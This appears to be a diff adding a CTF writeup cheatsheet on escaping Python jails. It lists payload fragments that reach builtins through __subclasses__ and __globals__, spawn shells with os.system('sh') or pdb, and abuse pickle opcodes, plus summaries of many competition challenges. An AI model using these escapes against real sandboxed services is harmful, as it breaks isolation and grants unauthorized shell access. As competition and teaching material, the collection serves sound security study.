@@ -1,0 +1,108 @@
+Pyjail - CTF Writeups by @jiegec
+
+Category: Misc
+
+Python Jail Escape Techniques
+
+This document provides a comprehensive collection of Python jail escape techniques from various CTF challenges. Python jails restrict execution by filtering characters, banning builtins, or limiting available operations.
+
+References: Pyjail Cheatsheet; Pyjail collection; A collection of pyjails; Pyjail cheatsheet
+
+Quick Reference Cheatsheet
+
+Unicode Character Bypass: Use Unicode characters that look like ASCII but bypass filters.
+
+Variable Assignment Without =:
+In exec contexts: a=1 (normal assignment)
+In eval contexts: [a:=1] (walrus operator)
+List comprehension: [a for a in [1]]
+Compact form with spaces: [[a]for[a]in[[1]]]
+
+Function Calls Without Parentheses:
+__import__('os') alternatives:
+help.__class__.__getitem__ = __import__;help['os']
+help.__class__.__contains__ = __import__('os').system;'sh' in help
+ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]
+help.__class__.__getattr__ = __import__; help.os
+breakpoint(): license._Printer__setup = breakpoint; str(license)
+exec(input()): @exec @input class a: pass
+
+String Construction Without Quotes:
+Character extraction: help.__doc__[index]
+
+Accessing Builtins When Banned:
+Get subclasses of object/tuple/etc:
+object: ().__class__.__base__.__subclasses__()
+object: ().__class__.__mro__[1].__subclasses__()
+tuple: ().__class__.__subclasses__()
+dict: {}.__class__.__subclasses__()
+Then get builtins via class.*.__globals__["__builtins__"].
+Or get shell without getting builtins via os._wrap_close __init__ __globals__["system"]("sh").
+When __import__ is available: ().__reduce_ex__(2)[0].__builtins__
+When you have access to exception: e.__traceback__.tb_frame.f_builtins
+
+Numbers and Booleans Without Digits:
+True: [[]]>[], not[]is[], []==[]
+False: []>[], []is[]
+Increment: -~x equals x + 1
+
+Obtaining Shell Access:
+os.system("sh"); os.execl("/bin/sh", "sh"); breakpoint(); code.interact(); pdb.set_trace(); subprocess.Popen(['sh']); pydoc.pipe_pager(text, cmd)
+
+Challenge-specific writeups:
+
+jailCTF 2026 the quasar files. Requirements: No builtins (use os._wrap_close __init__ __globals__["system"]("sh")); No []"' (use __getitem__ and ().__doc__.__getitem__).
+
+jailCTF 2026 collatz. No builtins (use codecs codecinfo __new__ __globals__["__builtins__"]["__import__"]("subprocess").check_call("rbash")); word lengths must conform to collatz sequence.
+
+SECCON CTF 14 2026 Final increasing. No builtins (use ().__setattr__.__objclass__.__subclasses__()); increasing length via hex literals and string slicing.
+
+TSG CTF 2025 SafePickle. Pickle without EXT1/EXT2/EXT4/REDUCE/INST/OBJ/PERSID/BINPERSID: use BUILD for license._Printer__setup = code.interact.
+
+HKCERT CTF 2025 Quals easyJail. Banned pickle NEWOBJ_EX/INST/REDUCE/OBJ/NEWOBJ: override pickle._Unpickler.pop_mark to code.interact and trigger via TUPLE.
+
+SECCON CTF 14 2025 Quals excepython. At most one occurrence per character .,(+: use lambda + __getattribute__, save intermediate values in exception KeyError.
+
+Hack.lu CTF 2025 FANGELSE. No more than 5 characters: use exit(flagbuf) to leak flag, override function in two steps.
+
+jailCTF 2025 impossible. No parens: use obj.__class__.__getitem__ and obj[arg]. No spaces or equal signs. No strings: set __getattr__ = __import__.
+
+jailCTF 2025 one. Only one dot: use lambda to reuse __getattribute__. No builtins: os subclasses chain.
+
+jailCTF 2025 primal. No getattr/setattr: use obj[name]. Words should have prime length.
+
+CrewCTF 2025 pyfuck. Only alphabetic characters, parentheses and plus sign.
+
+CrewCTF 2025 Bytecode Bonanza - Basics. Limit to opcodes POP_TOP/DUP_TOP/UNARY_INVERT/BINARY_ADD/POP_JUMP_IF_TRUE/EXTENDED_ARG in Python 3.9.
+
+WHY2025 CTF TitleCase. Use unicode bypass to avoid str.title().
+
+FortID CTF 2025 Michael Scottfield. Length <= 500; allow () but no parameters (pdb.set_trace()); no strings; no numbers; no builtins.
+
+LACTF 2025 farquaad. Only printable; no e or E; no builtins (().__class__.__mro__[1].__subclasses__()).
+
+scriptCTF 2025 Modulo. No builtins; no lowercase except c, only % binary op; no integers; no dot (use getattr).
+
+UIUCTF 2024 Astea. No function call (f-string); no builtins; no assignment (walrus).
+
+jailCTF 2024 filterd. Input length <= 14; blacklisted builtins: reuse existing function.
+
+jailCTF 2024 no-nonsense. No ([=]): decorators; AST name bypass via unicode; no newlines use \r.
+
+UofTCTF 2024 Jail Zero. No alphabetic (Mathematical Alphanumeric Symbols); no numbers; no double underscores (FULLWIDTH LOW LINE); no builtins.
+
+SECCON CTF 13 2024 Quals 1linepyjail. Length <= 100; allow () no parameters (sys.modules["pdb"].set_trace()); no builtins.
+
+ImaginaryCTF 2024 ok-nice. No numbers; exception side channel; len(set(input)) <= 17.
+
+ImaginaryCTF 2024 calc. Expression only (list comprehension); regex bypass via 1,; audit hook bypass.
+
+Dice CTF 2024 Quals unipickle. No whitespace: STACK_GLOBAL; valid UTF-8: BINPUT trick.
+
+TCP1P CTF 2023 PyMagic. No (); no strings; no numbers; no spaces (\r); no builtins.
+
+b01lers CTF 2023 Blacklisted. No ., _, parentheses, brackets, quotes, spaces: decorator syntax + form feed; blacklisted words via NFKC bypass.
+
+Sekai CTF 2023 just-another-pickle-jail. find_class limited to __main__: use BUILD to overwrite attributes.
+
+HITCON 2022 picklection. Pickle find_class limited to collections: namedtuple default argument reaches eval.
